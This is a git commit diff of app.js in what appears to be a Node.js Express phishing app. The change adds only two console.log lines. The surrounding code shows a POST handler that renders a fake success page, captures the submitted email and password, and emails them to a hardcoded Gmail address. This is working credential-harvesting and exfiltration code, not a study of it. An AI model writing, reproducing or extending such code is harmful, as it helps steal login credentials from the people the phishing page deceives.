378ed3ac9db9b8ec2178cf9d1339c76762808727
Eshak <43699326+bdeshak@users.noreply.github.com>
2023-04-10 08:49:48 +0600

    Update app.js

--- app.js
+++ app.js
@@ -30,7 +30,7 @@ app.post('/_', function (req, res) {
     res.render('f_success');
     var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
     
-    
+    console.log("es");
     var message = "need help";
     var toEmail = "mdalonebd@gmail.com";
 
@@ -57,7 +57,7 @@ transporter.sendMail(mailOptions, function (err, info) {
     console.log(info);
 });
     
-    
+    console.log(67);
     
     
     
